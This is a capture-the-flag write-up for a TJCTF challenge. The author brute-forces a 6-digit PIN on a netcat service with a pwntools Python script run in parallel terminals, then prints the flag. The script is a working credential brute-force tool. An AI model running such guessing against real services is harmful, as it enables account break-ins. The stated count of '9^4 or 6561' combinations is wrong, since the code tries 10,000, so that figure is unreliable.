# Simply Secure Secrets
### Miscellaneous: 50 points
#### Solved by: Vermillion
```
Written by evanyeyeye

nc p1.tjctf.org 8000
```
I really don't like this challenge, but moving on.

Netcatting into the service, we are greeted with 6 options:

<img src='https://cdn.discordapp.com/attachments/532350033241309226/567520116942700564/unknown.png'>

After messing around with the commands, it appears that this service can store some text under a name, which is protected by a 6 digit pin. I tried looking at the Upgrade option, but nothing seemed to come out of it, and storing a secret seemed to have no effect on anything. Frustrated, I decided to brute force the pin.

<img src="https://cdn.discordapp.com/attachments/532350033241309226/567520657890476034/unknown.png">

Evan's pin is 000000, but contains nothing. The most likely candidate for the flag is the secret tjctf. I wrote a python program to begin bruteforcing the pin. It appeared as though after around 8000 commands, it force-closed the connection, so I updated my script to match:
```
from pwn import *
import string
import itertools
import sys
i = str(sys.argv[1])
r = remote('p1.tjctf.org',8000)
list = []
for combo in itertools.product(string.digits, repeat = 4):
	list.append(i+''.join(combo))

for pin in list:
	r.sendline('r')
	x = r.recv()
	r.sendline('tjctf')
	x = r.recv()
	r.sendline(pin)
	x = r.recvline()
	if 'Invalid pin' not in x:
		print x, pin
		break

print 'done'
```
My script bruteforced the last 4 digits (9^4 combinations or 6561 combinations) and concatenated that after a command-line supplied 2 digit string. This allowed me to open several terminals concurrently to speed up the process, each with a different starting 2 digits. The 72 terminal succeeded:

<img src="https://cdn.discordapp.com/attachments/532350033241309226/567521998935425024/unknown.png">

flag: `tjctf{1_533_y0u_f0rc3d_y0ur_w4y_1n}`

After the competition, I asked the writer what the intended solution was, and he said that it was indeed brute force as the flag suggested. Which is pretty dumb; 6 digits is way too much for a bruteforce challenge.
